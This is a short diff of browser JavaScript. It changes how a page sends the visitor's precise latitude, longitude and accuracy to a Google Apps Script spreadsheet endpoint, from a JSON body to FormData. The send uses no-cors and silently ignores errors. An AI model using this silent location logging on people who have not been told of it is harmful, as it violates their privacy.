@@ -273,13 +273,17 @@
         const acc = Math.round(pos.coords.accuracy);
         const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-        // ✅ Enviando para Google Sheets
-		fetch('https://script.google.com/macros/s/AKfycbzHeS6v8Uq9_NCcu7-bGucsdVATabIO2LTDdXLQ0RJEYzVYFH-FuIo1AP6p6qF-LZFl/exec', {
-		  method: 'POST',
-		  mode: 'no-cors',
-		  headers: { 'Content-Type': 'application/json' },
-		  body: JSON.stringify({ lat, lon, accuracy: acc })
-		}).catch(() => {}); // ignora erros de rede silenciosamente
+
+        // Enviando para Google Sheets via FormData (no-cors)
+        const fd = new FormData();
+        fd.append('lat', lat);
+        fd.append('lon', lon);
+        fd.append('accuracy', acc);
+        fetch('https://script.google.com/macros/s/AKfycbzHeS6v8Uq9_NCcu7-bGucsdVATabIO2LTDdXLQ0RJEYzVYFH-FuIo1AP6p6qF-LZFl/exec', {
+          method: 'POST',
+          mode: 'no-cors',
+          body: fd
+        }).catch(() => {});
 
         result.className = 'result success';
         result.innerHTML = `
